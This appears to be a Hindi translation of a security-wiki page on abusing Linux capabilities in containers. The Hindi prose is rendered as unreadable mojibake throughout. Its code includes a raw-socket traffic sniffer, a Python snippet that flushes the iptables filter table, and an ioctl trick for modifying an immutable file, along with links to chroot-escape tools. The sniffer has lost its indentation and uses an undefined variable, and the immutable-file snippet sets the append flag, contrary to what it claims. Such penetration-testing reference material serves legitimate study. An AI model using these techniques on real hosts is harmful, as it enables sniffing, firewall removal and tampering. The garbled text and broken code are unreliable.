‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ñ‡§ø‡§≤‡§µ‡§æ‡§°‡§º ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à ‡§Ø‡§¶‡§ø ‡§´‡§º‡§æ‡§Ø‡§∞‡§µ‡•â‡§≤ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à ‡§ú‡•ã ‡§™‡•à‡§ï‡•á‡§ü ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§î‡§∞ ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§ï‡•ã ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç, ‡§Ø‡§π ‡§Ø‡•ã‡§ó‡•ç‡§Ø‡§§‡§æ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§®‡•á‡§Æ‡§∏‡•ç‡§™‡•á‡§∏ ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§™‡§§‡•á ‡§∏‡•á ‡§¨‡§æ‡§á‡§Ç‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§Ø‡•ã‡§ó‡•ç‡§Ø‡§§‡§æ ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞‡•Ä ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ã‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§∞‡§ñ‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§™‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§∏‡•á ICMP ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è RAW ‡§∏‡•â‡§ï‡•á‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡§∞ ‡§∏‡§ï‡•á‡•§

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§ü‡•ç‡§∞‡•à‡§´‡§ø‡§ï ‡§ï‡•ã ‡§∏‡•ç‡§®‡§ø‡§´‡§º ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§** ‡§á‡§∏ ‡§Ø‡•ã‡§ó‡•ç‡§Ø‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Ü‡§™ ‡§∏‡•Ä‡§ß‡•á ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§∏‡§ï‡§§‡•á‡•§

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§Ø‡§¶‡§ø ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä **`tcpdump`** ‡§á‡§∏ ‡§Ø‡•ã‡§ó‡•ç‡§Ø‡§§‡§æ ‡§ï‡•ã ‡§∞‡§ñ‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ü‡§™ ‡§á‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§∏‡•Ç‡§ö‡§®‡§æ ‡§ï‡•à‡§™‡•ç‡§ö‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç‡§ó‡•á‡•§
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
‡§®‡•ã‡§ü ‡§ï‡§∞‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§¶‡§ø **‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£** ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ü‡§™ **`tcpdump`** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ü‡•ç‡§∞‡•à‡§´‡§ø‡§ï ‡§∏‡•ç‡§®‡§ø‡§´ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§¶‡•ç‡§µ‡§ø‡§Ü‡§ß‡§æ‡§∞‡•Ä 2 ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ **`python2`** ‡§ï‡•ã‡§° ‡§π‡•à ‡§ú‡•ã "**lo**" (**localhost**) ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§ï‡•á ‡§ü‡•ç‡§∞‡•à‡§´‡§ø‡§ï ‡§ï‡•ã ‡§Ö‡§µ‡§∞‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§ï‡•ã‡§° [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) ‡§ï‡•á ‡§≤‡•à‡§¨ "_The Basics: CAP-NET\_BIND + NET\_RAW_" ‡§∏‡•á ‡§π‡•à‡•§
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ß‡§æ‡§∞‡§ï ‡§ï‡•ã ‡§Ö‡§®‡§æ‡§µ‡§∞‡§£‡§ø‡§§ ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§®‡•á‡§Æ‡§∏‡•ç‡§™‡•á‡§∏ ‡§ï‡•Ä ‡§´‡§º‡§æ‡§Ø‡§∞‡§µ‡•â‡§≤, ‡§∞‡•Ç‡§ü‡§ø‡§Ç‡§ó ‡§ü‡•á‡§¨‡§≤, ‡§∏‡•â‡§ï‡•á‡§ü ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç, ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§á‡§Ç‡§ü‡§∞‡§´‡§º‡•á‡§∏ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§î‡§∞ ‡§Ö‡§®‡•ç‡§Ø ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó‡•ç‡§∏ ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§π ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§á‡§Ç‡§ü‡§∞‡§´‡§º‡•á‡§∏ ‡§™‡§∞ ‡§≤‡§ó‡•á ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§®‡•á‡§Æ‡§∏‡•ç‡§™‡•á‡§∏ ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§∏‡•ç‡§®‡§ø‡§´‡§º ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡•§

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§ö‡§≤‡•ã ‡§Æ‡§æ‡§® ‡§≤‡•á‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø **‡§™‡§æ‡§Ø‡§•‡§® ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä** ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Ø‡•á ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§π‡•à‡§Ç‡•§
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§á‡§®‡•ã‡§° ‡§ó‡•Å‡§£‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§** ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Ü‡§™ ‡§∏‡•Ä‡§ß‡•á ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§∏‡§ï‡§§‡•á‡•§

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•ã ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§´‡§º‡§æ‡§á‡§≤ immutable ‡§π‡•à ‡§î‡§∞ python ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ **immutable ‡§ó‡•Å‡§£ ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§® ‡§Ø‡•ã‡§ó‡•ç‡§Ø ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§Ø‡§π ‡§Ö‡§µ‡§ø‡§ö‡§≤‡§®‡•Ä‡§Ø ‡§ó‡•Å‡§£‡§µ‡§§‡•ç‡§§‡§æ ‡§∏‡•á‡§ü ‡§î‡§∞ ‡§π‡§ü‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§∏‡•ç‡§§‡•á‡§Æ‡§æ‡§≤ ‡§ï‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ‡§ö‡•Ç‡§Ç‡§ï‡§ø `chroot(2)` ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡§∏‡•á ‡§ú‡•ç‡§û‡§æ‡§§ ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡•ã‡§Ç ‡§î‡§∞ ‡§≠‡§æ‡§ó‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä `chroot(2)` ‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à:

* [‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® chroot ‡§∏‡§Æ‡§æ‡§ß‡§æ‡§®‡•ã‡§Ç ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤‡§®‡•á ‡§ï‡§æ ‡§§‡§∞‡•Ä‡§ï‡§æ](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot ‡§≠‡§æ‡§ó‡§®‡•á ‡§ï‡§æ ‡§â‡§™‡§ï‡§∞‡§£](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `reboot(2)` ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§π‡§æ‡§∞‡•ç‡§°‡§µ‡•á‡§Ø‡§∞ ‡§™‡•ç‡§≤‡•á‡§ü‡§´‡•â‡§∞‡•ç‡§Æ ‡§ï‡•á ‡§≤‡§ø‡§è `LINUX_REBOOT_CMD_RESTART2` ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä **‡§∞‡•Ä‡§¨‡•Ç‡§ü ‡§ï‡§Æ‡§æ‡§Ç‡§°** ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§

‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§Ø‡§π ‡§≠‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à ‡§ï‡§ø `kexec_load(2)` ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è, ‡§ú‡•ã ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§ï‡•ç‡§∞‡•à‡§∂ ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§≤‡•ã‡§° ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ Linux 3.17 ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç, `kexec_file_load(2)` ‡§≠‡•Ä ‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡•ã ‡§∏‡§æ‡§á‡§® ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§ó‡§æ‡•§

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç Linux 2.6.37 ‡§Æ‡•á‡§Ç `CAP_SYS_ADMIN` ‡§ï‡•à‡§ö‡•â‡§≤ ‡§∏‡•á ‡§´‡•ã‡§∞‡•ç‡§ï ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ, ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã `syslog(2)` ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã `/proc/sys/kernel/kptr_restrict` 1 ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§π‡•ã‡§®‡•á ‡§™‡§∞ `/proc` ‡§î‡§∞ ‡§Ö‡§®‡•ç‡§Ø ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§µ‡§ø‡§ï‡§∏‡§ø‡§§ ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§™‡§§‡•ã‡§Ç ‡§ï‡•ã ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§

`kptr_restrict` ‡§∏‡§ø‡§∏‡•ç‡§ï‡§ü‡§≤ ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó 2.6.38 ‡§Æ‡•á‡§Ç ‡§™‡•á‡§∂ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ, ‡§î‡§∞ ‡§Ø‡§π ‡§®‡§ø‡§∞‡•ç‡§ß‡§æ‡§∞‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§™‡§§‡•á ‡§µ‡§ø‡§ï‡§∏‡§ø‡§§ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç ‡§Ø‡§æ ‡§®‡§π‡•Ä‡§Ç‡•§ ‡§Ø‡§π 2.6.39 ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§∏‡•á ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§∂‡•Ç‡§®‡•ç‡§Ø (‡§ï‡§∞‡•ç‡§®‡§≤ ‡§™‡§§‡•á ‡§µ‡§ø‡§ï‡§∏‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ) ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø ‡§ï‡§à ‡§µ‡§ø‡§§‡§∞‡§£ ‡§∏‡§π‡•Ä ‡§Æ‡§æ‡§® ‡§∏‡•á‡§ü ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç 1 (‡§∏‡§≠‡•Ä ‡§ï‡•ã ‡§õ‡§ø‡§™‡§æ‡§è‡§Ç ‡§ï‡•á‡§µ‡§≤ uid 0 ‡§ï‡•ã ‡§õ‡•ã‡§°‡§º‡§ï‡§∞) ‡§Ø‡§æ 2 (‡§π‡§Æ‡•á‡§∂‡§æ ‡§õ‡§ø‡§™‡§æ‡§è‡§Ç)‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã `dmesg` ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à, ‡§Ø‡§¶‡§ø `dmesg_restrict` ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó 1 ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç, `CAP_SYS_ADMIN` ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä ‡§ê‡§§‡§ø‡§π‡§æ‡§∏‡§ø‡§ï ‡§ï‡§æ‡§∞‡§£‡•ã‡§Ç ‡§∏‡•á `syslog` ‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) ‡§ï‡§æ ‡§µ‡§ø‡§∏‡•ç‡§§‡§æ‡§∞‡§ø‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§Ø‡§Æ‡§ø‡§§ ‡§´‡§º‡§æ‡§á‡§≤ (`S_IFREG`), FIFO (‡§®‡§æ‡§Æ‡§ø‡§§ ‡§™‡§æ‡§á‡§™) (`S_IFIFO`), ‡§Ø‡§æ UNIX ‡§°‡•ã‡§Æ‡•á‡§® ‡§∏‡•â‡§ï‡•á‡§ü (`S_IFSOCK`) ‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ ‡§ï‡•Å‡§õ ‡§î‡§∞ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§π‡•à‡§Ç:

* `S_IFCHR` (‡§µ‡§∞‡•ç‡§£ ‡§∏‡•ç‡§™‡•á‡§∂‡§≤ ‡§´‡§º‡§æ‡§á‡§≤ (‡§ü‡§∞‡•ç‡§Æ‡§ø‡§®‡§≤ ‡§ú‡•à‡§∏‡•Ä ‡§â‡§™‡§ï‡§∞‡§£))
* `S_IFBLK` (‡§¨‡•ç‡§≤‡•â‡§ï ‡§∏‡•ç‡§™‡•á‡§∂‡§≤ ‡§´‡§º‡§æ‡§á‡§≤ (‡§°‡§ø‡§∏‡•ç‡§ï ‡§ú‡•à‡§∏‡•Ä ‡§â‡§™‡§ï‡§∞‡§£))‡•§

‡§Ø‡§π ‡§è‡§ï ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))‡•§

‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•á ‡§§‡§π‡§§, ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∂‡§∞‡•ç‡§§‡•ã‡§Ç ‡§ï‡•á ‡§§‡§π‡§§ ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ ‡§™‡•ç‡§∞‡§ø‡§µ‡§ø‡§≤‡•á‡§ú ‡§á‡§∏‡•ç‡§ï‡•á‡§≤‡•á‡§∂‡§® (‡§™‡•Ç‡§∞‡•á ‡§°‡§ø‡§∏‡•ç‡§ï ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á) ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

1. ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ ‡§™‡•ç‡§∞‡§æ‡§∞‡§Ç‡§≠‡§ø‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è (‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡•Ä)‡•§
2. ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§™‡§∞ ‡§™‡•ç‡§∞‡§æ‡§∞‡§Ç‡§≠‡§ø‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è (‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•Ä (EUID 0), ‡§î‡§∞ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä `CAP_MKNOD`)‡•§
